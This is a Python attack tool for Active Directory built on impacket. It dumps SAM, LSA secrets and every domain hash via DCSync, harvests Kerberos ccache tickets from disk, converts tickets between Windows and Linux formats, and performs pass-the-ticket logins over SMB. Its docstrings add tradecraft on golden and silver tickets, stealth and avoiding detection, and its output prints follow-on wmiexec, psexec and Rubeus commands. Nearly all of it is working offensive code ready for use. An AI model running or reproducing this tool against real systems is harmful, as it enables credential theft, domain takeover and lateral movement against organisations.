#!/usr/bin/env python3

import argparse
import sys
import os
import struct
import glob
import getpass
from datetime import datetime, timezone
from binascii import hexlify

# ── impacket imports ──────────────────────────────────────────────────────────
try:
    from impacket.krb5.ccache import CCache, Credential, Header
    from impacket.krb5.asn1 import TGS_REP, AS_REP, EncASRepPart, EncTGSRepPart
    from impacket.krb5 import constants
    from impacket.krb5.types import Principal, KerberosTime
    from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
    from impacket.smbconnection import SMBConnection
    from impacket.dcerpc.v5 import transport, drsuapi, samr
    from impacket.secretsdump import RemoteOperations, NTDSHashes, LocalOperations
    from pyasn1.codec.ber import decoder, encoder
    from pyasn1.codec.native import decoder as nat_decoder
except ImportError as e:
    print(f"[!] Missing dependency: {e}")
    print("    Run: pip3 install impacket")
    sys.exit(1)

# ── colors ────────────────────────────────────────────────────────────────────
R  = "\033[91m"
G  = "\033[92m"
Y  = "\033[93m"
B  = "\033[94m"
C  = "\033[96m"
W  = "\033[97m"
M  = "\033[95m"
BO = "\033[1m"
RS = "\033[0m"

BANNER = f"""
{M}{BO}╔═════════════════════════════════════════════╗
║   K E R B E R O S   T I C K E T   H A R V E S T    ║
║   Dump | Parse | Convert | Pass-the-Ticket         ║
║        domain.com  |  192.168.x.x                  ║
╚════════════════════════════════════════════════════╝{RS}
"""


# ─────────────────────────────────────────────────────────────────────────────
# TECHNIQUE 1 — Remote LSASS Dump via secretsdump
# ─────────────────────────────────────────────────────────────────────────────
def technique_remote_dump(target, domain, username, password, nt_hash):
    """
    Dump credentials and Kerberos tickets from a remote machine
    using impacket's secretsdump via DCE/RPC.

    HOW secretsdump WORKS:
    ──────────────────────
    It uses multiple techniques depending on what's available:

    1. DRSUAPI (DCSync) — for Domain Controllers
       Calls DRSGetNCChanges() to replicate password hashes
       from the AD database, as if we were another DC.
       Gets: NT hashes, Kerberos keys, password history.
       → This is how DCSync works.

    2. SAM + SYSTEM registry hives — for workstations/servers
       Opens remote registry (WINREG pipe)
       Saves SAM, SYSTEM, SECURITY hives to temp files
       Extracts local account NT hashes from SAM
       Gets LSA secrets (service account passwords, cached creds)

    3. NTDS.dit — for DCs (via VSS)
       Creates a Volume Shadow Copy of the DC
       Copies ntds.dit + SYSTEM hive from shadow copy
       Extracts ALL domain hashes offline

    WHAT WE GET:
      NT hashes    → use for PTH, crack offline
      Kerberos keys → AES256/AES128/RC4 for tickets
      LSA secrets  → service account plaintext passwords
      Cached creds → local cached domain logon hashes (DCC2)

    WHY IT'S POWERFUL:
      No need to touch LSASS process directly (less AV triggers)
      Works remotely over SMB/DCE-RPC
      On a DC: gets EVERY domain account's hash in one call
    """
    print(f"\n{C}{BO}[ TECHNIQUE 1: Remote secretsdump ]{RS}")
    print(f"  {Y}Flow: SMB auth → DRSUAPI/SAMR/WINREG → hash + key extraction{RS}\n")

    lm_hash = "aad3b435b51404eeaad3b435b51404ee" if nt_hash else ""

    # ── Connect SMB ──
    print(f"  {B}[*] Connecting to {target} via SMB...{RS}")
    try:
        smb_conn = SMBConnection(target, target, sess_port=445, timeout=10)
        smb_conn.login(username, password, domain, lm_hash, nt_hash)
        print(f"  {G}  [+] SMB authenticated as {username}@{domain}{RS}")
    except Exception as e:
        print(f"  {R}  [!] SMB auth failed: {e}{RS}")
        return []

    # ── Setup RemoteOperations ──
    print(f"\n  {B}[*] Setting up remote operations (registry + VSS)...{RS}")
    try:
        remote_ops = RemoteOperations(smb_conn, False)
        remote_ops.enableRegistry()
        print(f"  {G}  [+] Remote registry enabled{RS}")
    except Exception as e:
        print(f"  {R}  [!] RemoteOperations failed: {e}{RS}")
        smb_conn.close()
        return []

    results = {
        'hashes':   [],
        'kerbkeys': [],
        'secrets':  []
    }

    # ── Dump SAM (local accounts) ──
    print(f"\n  {B}[*] Dumping SAM hive (local account hashes)...{RS}")
    print(f"  {C}    SAM stores NT hashes of local accounts encrypted with SYSKEY{RS}")
    try:
        boot_key    = remote_ops.getBootKey()
        SAM_hashes  = remote_ops.getMachineNameAndDomain()
        print(f"  {G}  [+] Boot key: {hexlify(boot_key).decode()}{RS}")
    except Exception as e:
        print(f"  {Y}  [~] SAM dump: {e}{RS}")

    # ── Dump LSA Secrets ──
    print(f"\n  {B}[*] Dumping LSA Secrets (service accounts, cached creds)...{RS}")
    print(f"  {C}    LSA Secrets: service account passwords, machine account hash,{RS}")
    print(f"  {C}    DPAPI master keys, cached domain logon hashes (DCC2){RS}")
    try:
        SE_ret    = remote_ops.getLSASecrets()
        if SE_ret:
            print(f"  {G}  [+] LSA secrets retrieved{RS}")
    except Exception as e:
        print(f"  {Y}  [~] LSA Secrets: {e}{RS}")

    # ── Try DRSUAPI (DCSync) if target is a DC ──
    print(f"\n  {B}[*] Attempting DCSync (DRSUAPI)...{RS}")
    print(f"  {C}    Works only on Domain Controllers.{RS}")
    print(f"  {C}    Replicates ALL domain account hashes as if we're another DC.{RS}")
    try:
        NTDSFileName = None
        ntds         = NTDSHashes(
            NTDSFileName,
            boot_key if 'boot_key' in dir() else None,
            isRemote=True,
            history=False,
            noLMHash=True,
            remoteOps=remote_ops,
            useVSSMethod=False,
            justNTLM=False,
            pwdLastSet=False,
            resumeSession=None,
            outputFileName=None,
            justUser=None,
            printUserStatus=False
        )

        print(f"\n  {G}{BO}  [ DOMAIN HASHES ]{RS}")
        print(f"  {'─'*60}")

        def hash_callback(secret):
            """Called for each extracted hash."""
            print(f"  {W}{secret}{RS}")
            results['hashes'].append(secret)

            # Highlight high-value accounts
            line = str(secret).lower()
            if 'administrator' in line or 'krbtgt' in line:
                print(f"  {R}{BO}  ↑ HIGH VALUE ACCOUNT!{RS}")

        ntds.dump(hash_callback)
        ntds.finish()

    except Exception as e:
        print(f"  {Y}  [~] DCSync not available: {e}{RS}")
        print(f"  {Y}      Target may not be a DC, or missing replication rights{RS}")

    # ── Cleanup ──
    try:
        remote_ops.finish()
    except:
        pass
    smb_conn.close()

    print(f"\n  {G}[+] Dump complete. {len(results['hashes'])} hashes collected.{RS}")
    return results


# ─────────────────────────────────────────────────────────────────────────────
# TECHNIQUE 2 — Parse .ccache files (Linux)
# ─────────────────────────────────────────────────────────────────────────────
def technique_parse_ccache(ccache_dir="/tmp", ccache_file=None):
    """
    Parse Kerberos .ccache files and display all stored tickets.

    WHAT IS A .ccache FILE?
    ──────────────────────
    On Linux/Unix, Kerberos tickets are stored in credential cache files.
    Format: MIT Kerberos ccache (binary format)
    Default location: /tmp/krb5cc_<UID>

    Each file can contain multiple credentials:
      - TGTs (Ticket Granting Tickets)
      - Service tickets (TGS)

    STRUCTURE OF A CREDENTIAL ENTRY:
      client   = who the ticket is for (e.g. Administrator@domain.com)
      server   = what service it's for (e.g. krbtgt/domain.com or cifs/DC)
      keyblock = session key (encrypted)
      authtime = when the ticket was issued
      starttime= when it becomes valid
      endtime  = when it expires
      ticket   = the actual Kerberos ticket blob

    WHEN YOU'D FIND THESE IN A PENTEST:
      - Compromised Linux machine with sysadmin logged in
      - Service accounts running Kerberos-authenticated daemons
      - CI/CD systems (Jenkins, GitLab runners) with k8s auth
      - After running kinit or any Kerberos-aware tool

    WHAT TO DO WITH THEM:
      export KRB5CCNAME=/tmp/krb5cc_0
      python3 wmiexec.py -k -no-pass Administrator@DC.domain.com
    """
    print(f"\n{C}{BO}[ TECHNIQUE 2: Parse .ccache Files ]{RS}")
    print(f"  {Y}Parsing Kerberos credential cache files for tickets{RS}\n")

    # Find ccache files
    if ccache_file:
        files = [ccache_file]
    else:
        patterns = [
            os.path.join(ccache_dir, "krb5cc_*"),
            os.path.join(ccache_dir, "*.ccache"),
            os.path.join(ccache_dir, "ccache"),
            "/var/lib/sss/db/ccache_*",
        ]
        files = []
        for pat in patterns:
            files.extend(glob.glob(pat))

        # Also check KRB5CCNAME env var
        env_cache = os.environ.get('KRB5CCNAME', '')
        if env_cache and env_cache not in files and os.path.exists(env_cache):
            files.append(env_cache)

    if not files:
        print(f"  {Y}[~] No .ccache files found in {ccache_dir}{RS}")
        print(f"  {Y}    Try specifying --ccache-file directly{RS}")
        return []

    print(f"  {G}[+] Found {len(files)} ccache file(s){RS}\n")
    all_tickets = []

    for filepath in files:
        print(f"  {W}{BO}[ {filepath} ]{RS}")
        try:
            cc = CCache.loadFile(filepath)
        except Exception as e:
            print(f"  {R}  [!] Could not parse: {e}{RS}\n")
            continue

        # Principal (who owns this cache)
        try:
            principal = cc.principal.prettyPrint()
            print(f"  {C}  Owner: {principal}{RS}")
        except:
            print(f"  {C}  Owner: (unknown){RS}")

        if not cc.credentials:
            print(f"  {Y}  (empty cache){RS}\n")
            continue

        print(f"  {'─'*55}")
        print(f"  {'SERVICE':<40} {'EXPIRES':<20} TYPE")
        print(f"  {'─'*55}")

        for cred in cc.credentials:
            try:
                # Server principal = what this ticket grants access to
                server   = cred['server'].prettyPrint()
                endtime_raw = cred['time']['endtime']

                # Parse expiry
                try:
                    endtime = KerberosTime.fromASN1(endtime_raw)
                    now     = datetime.now(timezone.utc)
                    expired = endtime < now
                    exp_str = endtime.strftime("%Y-%m-%d %H:%M")
                    exp_col = R if expired else G
                    exp_tag = " [EXPIRED]" if expired else ""
                except:
                    exp_str = "unknown"
                    exp_col = Y
                    exp_tag = ""

                # Identify ticket type
                if 'krbtgt' in server.lower():
                    ttype   = f"{Y}TGT{RS}"
                    is_tgt  = True
                else:
                    ttype   = f"{B}TGS{RS}"
                    is_tgt  = False

                print(f"  {W}{server:<40}{RS} "
                      f"{exp_col}{exp_str}{exp_tag}{RS:<10} {ttype}")

                # Show session key info
                try:
                    keytype = cred['key']['keytype']
                    keydata = bytes(cred['key']['keyvalue'])
                    etype_names = {
                        17: "AES128",
                        18: "AES256",
                        23: "RC4-HMAC",
                        1:  "DES-CRC",
                        3:  "DES-MD5"
                    }
                    etype_name = etype_names.get(int(keytype), f"etype-{keytype}")
                    print(f"    {C}Key: {etype_name} | {hexlify(keydata).decode()[:32]}...{RS}")
                except:
                    pass

                all_tickets.append({
                    'file':   filepath,
                    'server': server,
                    'is_tgt': is_tgt,
                    'cred':   cred
                })

            except Exception as e:
                print(f"  {R}  Error reading credential: {e}{RS}")

        print()

    # ── Summary + usage tips ──
    tgts = [t for t in all_tickets if t['is_tgt']]
    tgss = [t for t in all_tickets if not t['is_tgt']]

    print(f"\n  {G}{BO}Summary:{RS}")
    print(f"  {G}  TGTs found:          {len(tgts)}{RS}")
    print(f"  {G}  Service tickets:     {len(tgss)}{RS}")
    print(f"  {G}  Total credentials:   {len(all_tickets)}{RS}")

    if tgts:
        print(f"\n  {C}Use a TGT for full access:{RS}")
        for t in tgts[:3]:
            print(f"  {W}  export KRB5CCNAME={t['file']}{RS}")
            print(f"  {W}  python3 wmiexec.py -k -no-pass domain.com/Administrator@WIN-RM9TRCNVS9P.domain.com{RS}")

    return all_tickets


# ─────────────────────────────────────────────────────────────────────────────
# TECHNIQUE 3 — Convert .kirbi ↔ .ccache
# ─────────────────────────────────────────────────────────────────────────────
def technique_convert(input_file, output_file):
    """
    Convert Kerberos tickets between Windows (.kirbi) and Linux (.ccache).

    WHY CONVERSION IS NEEDED:
    ──────────────────────────
    Windows tools (Mimikatz, Rubeus) export tickets as .kirbi (KRB-CRED ASN.1)
    Linux tools (impacket) use .ccache (MIT Kerberos format)

    You dump tickets from Windows → get .kirbi files
    You need to use them on Kali with impacket → need .ccache

    And the reverse: you have a forged .ccache (Golden Ticket)
    and need to import it on a Windows machine → convert to .kirbi
    then: Rubeus.exe ptt /ticket:<base64-kirbi>

    FORMAT DETAILS:
      .kirbi = KRB-CRED structure (ASN.1 DER encoded)
               Contains: tickets array + enc-part with session keys
               Often base64 encoded when transferred

      .ccache = Binary format defined by MIT
               Header + credentials array
               Each credential = flags + key + times + ticket
    """
    print(f"\n{C}{BO}[ TECHNIQUE 3: Ticket Format Conversion ]{RS}")

    if not os.path.exists(input_file):
        print(f"  {R}[!] Input file not found: {input_file}{RS}")
        sys.exit(1)

    # ── Detect direction ──
    ext_in  = input_file.lower().split('.')[-1]
    ext_out = output_file.lower().split('.')[-1]

    print(f"  {C}Input:  {input_file} ({ext_in}){RS}")
    print(f"  {C}Output: {output_file} ({ext_out}){RS}\n")

    if ext_in == 'ccache' and ext_out in ('kirbi', 'bin'):
        _ccache_to_kirbi(input_file, output_file)

    elif ext_in in ('kirbi', 'bin') and ext_out == 'ccache':
        _kirbi_to_ccache(input_file, output_file)

    elif ext_in == 'ccache' and ext_out == 'ccache':
        # ccache → ccache: useful to extract one ticket from a multi-ticket cache
        print(f"  {Y}[~] Same format — copying with normalization{RS}")
        cc = CCache.loadFile(input_file)
        cc.saveFile(output_file)
        print(f"  {G}[+] Saved: {output_file}{RS}")

    else:
        print(f"  {R}[!] Cannot determine conversion direction.{RS}")
        print(f"      Supported: .kirbi → .ccache  or  .ccache → .kirbi")
        sys.exit(1)


def _kirbi_to_ccache(kirbi_path, ccache_path):
    """
    Convert .kirbi (KRB-CRED) → .ccache

    KRB-CRED structure:
      pvno      = 5
      msg-type  = 22 (KRB_CRED)
      tickets   = array of Ticket ASN.1 objects
      enc-part  = EncKrbCredPart (session keys, client/server info, times)

    impacket's CCache.fromKirbi() handles the heavy lifting.
    """
    print(f"  {B}[*] Reading .kirbi file...{RS}")
    try:
        with open(kirbi_path, 'rb') as f:
            data = f.read()

        # Handle base64-encoded .kirbi (common from Rubeus output)
        try:
            import base64
            decoded = base64.b64decode(data)
            data    = decoded
            print(f"  {Y}    (detected base64 encoding, decoded){RS}")
        except:
            pass

        print(f"  {B}[*] Parsing KRB-CRED structure...{RS}")
        cc = CCache()
        cc.fromKirbi(data)

        cc.saveFile(ccache_path)
        print(f"  {G}[+] Converted! Saved to: {ccache_path}{RS}")
        print(f"\n  {C}Use it:{RS}")
        print(f"  {W}  export KRB5CCNAME={ccache_path}{RS}")
        print(f"  {W}  python3 wmiexec.py -k -no-pass domain.com/Administrator@192.168.x.x{RS}")

    except Exception as e:
        print(f"  {R}[!] Conversion failed: {e}{RS}")


def _ccache_to_kirbi(ccache_path, kirbi_path):
    """
    Convert .ccache → .kirbi (KRB-CRED)
    Then it can be imported on Windows with:
      Rubeus.exe ptt /ticket:<base64>
      Or: [System.IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<b64>"))
          kerberos::ptt ticket.kirbi (Mimikatz)
    """
    print(f"  {B}[*] Loading .ccache...{RS}")
    try:
        cc      = CCache.loadFile(ccache_path)
        kirbi   = cc.toKirbi()

        with open(kirbi_path, 'wb') as f:
            f.write(kirbi)

        import base64
        b64 = base64.b64encode(kirbi).decode()
        print(f"  {G}[+] Saved .kirbi: {kirbi_path}{RS}")
        print(f"\n  {C}Base64 (for Rubeus ptt):{RS}")
        print(f"  {Y}{b64[:80]}...{RS}")
        print(f"\n  {C}Import on Windows:{RS}")
        print(f"  {W}  Rubeus.exe ptt /ticket:{b64[:40]}...{RS}")

    except Exception as e:
        print(f"  {R}[!] Conversion failed: {e}{RS}")


# ─────────────────────────────────────────────────────────────────────────────
# TECHNIQUE 4 — Pass-the-Ticket (use harvested ticket for access)
# ─────────────────────────────────────────────────────────────────────────────
def technique_pass_the_ticket(ccache_file, target, domain, username, service="cifs"):
    """
    Pass-the-Ticket (PTT): use a harvested .ccache to authenticate.

    DIFFERENCE FROM PASS-THE-HASH:
    ────────────────────────────────
    Pass-the-Hash: use NT hash → NTLM authentication
      → Works even if Kerberos is disabled
      → Doesn't require a KDC to be reachable

    Pass-the-Ticket: use Kerberos ticket → Kerberos authentication
      → Ticket is already issued — no password needed
      → More stealthy (no NTLM negotiation)
      → Required when PTH is blocked (e.g., Protected Users group)
      → Works with forged tickets (Golden/Silver)

    HOW IT WORKS:
    ─────────────
    1. Load the .ccache file
    2. Set KRB5CCNAME environment variable → tells Kerberos libs where tickets are
    3. Connect to target using Kerberos auth
    4. The ticket is presented to the service automatically

    WHAT YOU CAN DO WITH A TGT:
      → Request any service ticket (TGS) for any service
      → Effectively authenticated as that user for TGT's lifetime

    WHAT YOU CAN DO WITH A TGS (service ticket):
      → Access ONLY that specific service
      → e.g., cifs/DC → SMB access to DC
      → But can't access other services without the TGT

    GOLDEN TICKET:
      Forged TGT using krbtgt hash
      → Valid for 10 years (default)
      → Works for ANY service
      → Even if user's real password changes

    SILVER TICKET:
      Forged TGS using service account's hash
      → Doesn't touch the KDC (no DC needed after forging!)
      → Only works for that specific service
      → Much stealthier than Golden Ticket
    """
    print(f"\n{C}{BO}[ TECHNIQUE 4: Pass-the-Ticket ]{RS}")
    print(f"  {Y}Loading ticket and authenticating without password{RS}\n")

    if not os.path.exists(ccache_file):
        print(f"  {R}[!] ccache file not found: {ccache_file}{RS}")
        sys.exit(1)

    # ── Show ticket info ──
    print(f"  {B}[*] Inspecting ticket: {ccache_file}{RS}")
    try:
        cc = CCache.loadFile(ccache_file)
        print(f"  {C}  Credentials in cache: {len(cc.credentials)}{RS}")
        for cred in cc.credentials:
            try:
                server = cred['server'].prettyPrint()
                print(f"  {G}  ✓ {server}{RS}")
            except:
                pass
    except Exception as e:
        print(f"  {R}  [!] Failed to read ccache: {e}{RS}")
        sys.exit(1)

    # ── Set KRB5CCNAME ──
    print(f"\n  {B}[*] Setting KRB5CCNAME → {ccache_file}{RS}")
    os.environ['KRB5CCNAME'] = ccache_file
    print(f"  {G}  [+] Kerberos libs will use this cache{RS}")

    # ── Test access via SMB ──
    print(f"\n  {B}[*] Testing SMB access to {target} using ticket...{RS}")
    print(f"  {C}    Connecting with Kerberos (no password){RS}")
    try:
        smb_conn = SMBConnection(target, target, sess_port=445, timeout=10)
        smb_conn.kerberosLogin(
            username, "", domain,
            lmhash="", nthash="", aesKey="",
            kdcHost=target
        )
        print(f"  {G}  [+] SMB authenticated via Kerberos ticket!{RS}")
        print(f"  {G}      OS: {smb_conn.getServerOS()}{RS}")
        print(f"  {G}      Signed: {smb_conn.isSigningRequired()}{RS}")

        # List shares
        print(f"\n  {B}[*] Enumerating shares...{RS}")
        shares = smb_conn.listShares()
        print(f"  {G}  Accessible shares:{RS}")
        for share in shares:
            name = share['shi1_netname'][:-1]
            print(f"    {W}  {name}{RS}")

        smb_conn.close()

    except Exception as e:
        print(f"  {R}  [!] SMB with ticket failed: {e}{RS}")
        print(f"  {Y}    Reasons:")
        print(f"      - Ticket expired")
        print(f"      - Wrong target (SPN mismatch)")
        print(f"      - DNS resolution required (use FQDN not IP for Kerberos){RS}")

    # ── Print usage commands ──
    fqdn = f"WIN-RM9TRCNVS9P.{domain}" if '.' not in target else target
    print(f"\n  {C}{BO}Use this ticket with impacket tools:{RS}")
    print(f"  {W}  export KRB5CCNAME={ccache_file}{RS}")
    print(f"  {W}  python3 wmiexec.py  -k -no-pass {domain}/{username}@{fqdn}{RS}")
    print(f"  {W}  python3 smbclient.py -k -no-pass {domain}/{username}@{fqdn}{RS}")
    print(f"  {W}  python3 psexec.py    -k -no-pass {domain}/{username}@{fqdn}{RS}")
    print(f"  {W}  python3 secretsdump.py -k -no-pass {domain}/{username}@{fqdn}{RS}")


# ─────────────────────────────────────────────────────────────────────────────
# REQUEST FRESH TICKET (bonus utility)
# ─────────────────────────────────────────────────────────────────────────────
def request_ticket(username, password, domain, dc_ip, nt_hash="", target_spn=""):
    """
    Request a fresh TGT (and optionally a TGS) and save to .ccache.

    Useful when:
      - You have creds and want a ticket for PTT
      - You want to avoid NTLM (e.g., monitoring detects NTLM auth)
      - You need a specific service ticket
    """
    print(f"\n{C}{BO}[ BONUS: Request Fresh Ticket ]{RS}")
    lm_hash = "aad3b435b51404eeaad3b435b51404ee" if nt_hash else ""

    user_principal = Principal(
        username,
        type=constants.PrincipalNameType.NT_PRINCIPAL.value
    )

    print(f"  {B}[*] Requesting TGT for {username}@{domain.upper()}{RS}")
    try:
        if nt_hash:
            tgt, cipher, old_sk, sk = getKerberosTGT(
                clientName=user_principal,
                password="",
                domain=domain,
                lmhash=bytes.fromhex(lm_hash),
                nthash=bytes.fromhex(nt_hash),
                aesKey="",
                kdcHost=dc_ip
            )
        else:
            tgt, cipher, old_sk, sk = getKerberosTGT(
                clientName=user_principal,
                password=password,
                domain=domain,
                lmhash=b"",
                nthash=b"",
                aesKey="",
                kdcHost=dc_ip
            )
        print(f"  {G}  [+] TGT obtained!{RS}")
    except Exception as e:
        print(f"  {R}  [!] TGT failed: {e}{RS}")
        return

    # Save TGT
    outfile = f"{username}_tgt.ccache"
    cc = CCache()
    cc.fromTGT(tgt, f"{username}@{domain.upper()}", f"krbtgt/{domain.upper()}")
    cc.saveFile(outfile)
    print(f"  {G}  [+] TGT saved: {outfile}{RS}")

    # Optional: get TGS for specific service
    if target_spn:
        print(f"\n  {B}[*] Requesting TGS for {target_spn}...{RS}")
        try:
            server = Principal(
                target_spn,
                type=constants.PrincipalNameType.NT_SRV_INST.value
            )
            tgs, c2, o2, s2 = getKerberosTGS(
                serverName=server,
                domain=domain,
                kdcHost=dc_ip,
                tgt=tgt,
                cipher=cipher,
                sessionKey=sk
            )
            tgs_file = f"{username}_{target_spn.replace('/', '_')}.ccache"
            cc2 = CCache()
            cc2.fromTGS(tgs, f"{username}@{domain.upper()}", target_spn)
            cc2.saveFile(tgs_file)
            print(f"  {G}  [+] TGS saved: {tgs_file}{RS}")
        except Exception as e:
            print(f"  {R}  [!] TGS failed: {e}{RS}")

    print(f"\n  {C}Use:{RS}")
    print(f"  {W}  export KRB5CCNAME={outfile}{RS}")


# ─────────────────────────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────────────────────────
def main():
    args = parse_args()
    print(BANNER)

    if args.method == "dump":
        password = args.password or ""
        nt_hash  = args.nt_hash  or ""
        if not password and not nt_hash:
            ch = input(f"{W}Auth — (1) Password  (2) NT Hash: {RS}").strip()
            if ch == "2":
                nt_hash = input("NT Hash: ").strip()
            else:
                password = getpass.getpass("Password: ")
        technique_remote_dump(args.target, args.domain,
                              args.username, password, nt_hash)

    elif args.method == "ccache":
        technique_parse_ccache(
            ccache_dir=args.ccache_dir or "/tmp",
            ccache_file=args.ccache_file or None
        )

    elif args.method == "convert":
        if not args.input or not args.output:
            print(f"{R}[!] --method convert requires --input and --output{RS}")
            sys.exit(1)
        technique_convert(args.input, args.output)

    elif args.method == "ptt":
        if not args.ccache_file:
            print(f"{R}[!] --method ptt requires --ccache-file{RS}")
            sys.exit(1)
        technique_pass_the_ticket(
            args.ccache_file, args.target or "192.168.x.x",
            args.domain, args.username
        )

    elif args.method == "request":
        password = args.password or ""
        nt_hash  = args.nt_hash  or ""
        if not password and not nt_hash:
            password = getpass.getpass("Password: ")
        request_ticket(
            args.username, password, args.domain,
            args.target or "192.168.x.x", nt_hash,
            target_spn=args.spn or ""
        )

    else:
        print(f"{R}Unknown method.{RS}")
        print("Use: --method dump | ccache | convert | ptt | request")


def parse_args():
    p = argparse.ArgumentParser(
        description="Kerberos Ticket Harvesting — Dump, Parse, Convert, PTT",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Methods:
  dump     Remote secretsdump via DCE/RPC (hashes + Kerberos keys)
  ccache   Parse .ccache files on disk
  convert  Convert .kirbi <-> .ccache
  ptt      Pass-the-Ticket: use .ccache for auth
  request  Request fresh TGT/TGS and save to .ccache

Examples:
  python3 intercept_kerberos_tickets.py --method dump -t 192.168.x.x -u Administrator -p 'Testing123!'
  python3 intercept_kerberos_tickets.py --method ccache --ccache-dir /tmp
  python3 intercept_kerberos_tickets.py --method ccache --ccache-file /tmp/krb5cc_0
  python3 intercept_kerberos_tickets.py --method convert --input ticket.kirbi --output ticket.ccache
  python3 intercept_kerberos_tickets.py --method ptt --ccache-file admin.ccache -t 192.168.x.x -u Administrator
  python3 intercept_kerberos_tickets.py --method request -t 192.168.x.x -u Administrator -p 'Testing123!' --spn cifs/WIN-RM9TRCNVS9P.domain.com
        """
    )
    p.add_argument("--method",      required=True,
                   choices=["dump","ccache","convert","ptt","request"],
                   help="Technique to use")
    p.add_argument("-t",  "--target",     default="192.168.x.x",  help="Target IP/hostname")
    p.add_argument("-u",  "--username",   default="Administrator", help="Username")
    p.add_argument("-p",  "--password",   default="",              help="Password")
    p.add_argument("--nt-hash",           default="",              help="NT hash")
    p.add_argument("-d",  "--domain",     default="domain.com",     help="Domain")
    p.add_argument("--ccache-dir",        default="/tmp",          help="Directory to scan for ccache files")
    p.add_argument("--ccache-file",       default="",              help="Specific .ccache file to use")
    p.add_argument("--input",             default="",              help="Input ticket file (convert)")
    p.add_argument("--output",            default="",              help="Output ticket file (convert)")
    p.add_argument("--spn",               default="",              help="Target SPN for TGS request")
    return p.parse_args()


if __name__ == "__main__":
    main()
